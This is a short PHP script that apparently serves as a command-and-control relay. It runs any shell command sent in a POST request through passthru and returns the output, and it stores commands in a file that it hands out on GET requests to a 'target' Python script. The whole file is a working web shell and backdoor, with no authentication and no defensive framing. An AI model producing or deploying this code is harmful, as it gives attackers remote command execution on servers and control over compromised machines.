if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Handle data received from the Python script
    $data = $_POST['data'];
    file_put_contents('Data.io', $data); // Save the data to a file

    // Execute the command and capture its output
    ob_start();
    passthru($data, $return_code);
    $command_output = ob_get_clean();

    // Send the command output and return code to the Python script
    echo json_encode([
        'command_output' => $command_output,
        'command_error' => ($return_code === 0) ? '' : 'Command failed with error code ' . $return_code,
    ]);
} else if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // Handle requests from the target Python script
    $data = file_get_contents('Data.io');
    if (!empty($data)) {
        // Data is available; send it to the target script
        echo $data;
    } else {
        // No data available
        echo "No data available.\n";
    }
}
